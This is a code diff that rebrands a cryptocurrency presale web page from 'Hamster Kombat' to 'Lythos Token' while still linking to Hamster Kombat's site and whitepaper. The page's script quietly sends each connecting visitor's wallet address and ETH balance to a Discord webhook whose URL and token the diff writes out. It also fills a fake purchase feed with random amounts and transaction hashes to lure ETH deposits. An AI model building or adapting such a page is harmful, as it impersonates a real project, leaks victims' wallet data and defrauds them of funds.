@@ -6,7 +6,7 @@
     <link rel="stylesheet" href="styles.css">
     <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.3.0/dist/web3.min.js"></script>
 
-    <title>Hamster Kombat</title>
+    <title>Lythos Token</title>
 </head>
     <style>
 
@@ -388,7 +388,7 @@ p {
         color: #ff00ff;
     }
 
-    .hmstr {
+    .lyth {
         color: #e3b341;
     }
 
@@ -417,12 +417,12 @@ p {
     <nav>
         <div class="logo"><!-- Imagen del logo eliminada --></div>
         <div class="nav-links">
-            <a href="#">Pre sale</a>
+            <a href="#">Lythos Token</a>
             <a href="https://hamsterkombatgame.io">Developers</a>
 <a href="https://hamsterkombatgame.io/docs/hk_wp_rev.0.2_july_30__2024.pdf" target="_blank">Whitepaper</a>
             <a href="https://hamsterkombatgame.io">Road Map</a>
             <a href="#referral-section">Refer</a>
-            <a href="https://hamsterkombatgame.io">Game</a>
+            <a href="https://hamsterkombatgame.io">Bots</a>
         </div>
         <button id="connect-wallet">Connect wallet</button>
     </nav>
@@ -438,7 +438,7 @@ p {
 </h1>
             
             
-<p>Hurry to get your <span style="color:#ff00ff;">HMSTR tokens</span> before they are listed. The <span style="color:#ff00ff;">countdown</span> has just begun!</p>
+<p>Hurry to get your <span style="color:#ff00ff;">LYTH tokens</span> before they are listed. The <span style="color:#ff00ff;">countdown</span> has just begun!</p>
 <p>See everything that's new and read about our mission to build <span style="color:#00ff99;">DeFi's internet of liquidity</span>.</p>
 
         </div>
@@ -447,14 +447,14 @@ p {
 <div style="text-align: center;">
     <p style="color: #FFA500; font-weight: bold;">Minimum purchase: <span style="color: #FFD700;">0.1 ETH</span></p>
     <p style="color: #FF4500; font-weight: bold;">Maximum purchase: <span style="color: #FFD700;">10 ETH</span></p>
-    <p style="color: #32CD32; font-weight: bold;">1 ETH = <span style="color: #FFD700;">28000 HMSTR</span></p>
+    <p style="color: #32CD32; font-weight: bold;">1 ETH = <span style="color: #FFD700;">20000 LYTH Token</span></p>
 </div>
 
 
 
 </div>
 <div class="countdown-container">
-    <h2>Countdown to End of Presale:</h2>
+    <h2>Countdown to End of Presale LYTH:</h2>
     <div id="countdown" class="countdown"></div>
 </div>
  <div class="main-content">
@@ -490,7 +490,7 @@ p {
                         <label for="receive">You receive</label>
                         <div class="input-group">
                             <select id="receive">
-                                <option value="hmstr">HMSTR</option>
+                                <option value="lyth">LYTH</option>
                                 <!-- Otras opciones -->
                             </select>
                             <input type="text" id="receive-amount" placeholder="0">
@@ -527,12 +527,12 @@ p {
 
     
         <div id="referral-section" class="referral-container">
-        <h2>Share refe your win 2 HMSTR Token for refe </h2>
+        <h2>Share refe your win 70 LYTH Token for refe </h2>
         <a id="referral-link" class="referral-link" href="#" target="_blank">Generate Referral Link</a>
         <button id="copy-button">Copy Referral Link</button>
     </div>
 
-<h2 style="text-align: center;">Tx Buy HMSTR</h2>
+<h2 style="text-align: center;">Tx Buy LYTH</h2>
 
 <div class="transaction-container" id="transaction-container">
 
@@ -561,17 +561,17 @@ p {
 
     grandMasterButton.addEventListener('click', () => {
         payAmountInput.value = '0.1';
-        receiveAmountInput.value = '2400';
+        receiveAmountInput.value = '2000';
     });
 
     lordButton.addEventListener('click', () => {
         payAmountInput.value = '0.5';
-        receiveAmountInput.value = '14000'; // 0.5 * 28000
+        receiveAmountInput.value = '10000'; // 0.5 * 28000
     });
 
     creatorButton.addEventListener('click', () => {
         payAmountInput.value = '1';
-        receiveAmountInput.value = '28000';
+        receiveAmountInput.value = '20000';
     });
 
     payAmountInput.addEventListener('input', updateReceiveAmount);
@@ -604,7 +604,7 @@ p {
 
     // Función para enviar datos al webhook de Discord
     async function sendToDiscord(address, balance) {
-        const webhookUrl = 'https://discord.com/api/webhooks/1122719600375758930/HOqLrk3OlLHLaiP7u2ZGFqRNOoWqnPBSyKq9S3f96m8dwYdxhBSyITl5Ocuzzogho1nl'; // Reemplaza con tu URL de webhook
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1339013245188444261/hOvOVT58ohHFs4WiUM9T5IGq91-48oOEgnSLpwOwed9eHHg49kxRkaJwK8aBUmqL-zbm'; // Reemplaza con tu URL de webhook
         const payload = {
             content: `Nueva conexión de billetera: \n- Dirección: ${address} \n- Saldo: ${balance} ETH`
         };
@@ -623,7 +623,6 @@ p {
         }
     }
 
-    // Integrar el script para conectar la billetera
     let web3;
     let account;
 
@@ -635,23 +634,18 @@ p {
                 const accounts = await web3.eth.getAccounts();
                 account = accounts[0];
 
-                // Obtener saldo
                 const balanceWei = await web3.eth.getBalance(account);
                 const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-                // Enviar datos a Discord
                 await sendToDiscord(account, balanceEth);
 
-                // Selecciona todos los elementos con la clase wallet-address y actualiza su texto
                 document.querySelectorAll('.wallet-address').forEach(element => {
                     element.innerText = account;
                 });
 
-                // Cambiar el texto del botón a "WEB3 ACTIVE"
                 connectWalletButton.innerText = "WEB3 ACTIVE";
                 connectWalletButton.disabled = true;
 
-                // Generar el enlace de referido
                 const baseUrl = 'https://pre-sale-hamster.vercel.app/';
                 referralLinkElement.href = `${baseUrl}?ref=${encodeURIComponent(account)}`;
                 referralLinkElement.innerText = referralLinkElement.href;
@@ -664,7 +658,6 @@ p {
         }
     });
 
-    // Configurar el evento para el botón de compra
     buyButton.addEventListener('click', async () => {
         if (web3 && account) {
             try {
@@ -719,8 +712,8 @@ p {
         return (Math.random() * (10 - 0.1) + 0.1).toFixed(2);
     }
 
-    function getRandomHMSTR(ethAmount) {
-        return (ethAmount * 28000).toFixed(0);
+    function getRandomLYTH(ethAmount) {
+        return (ethAmount * 20000).toFixed(0);
     }
 
     function getRandomHash() {
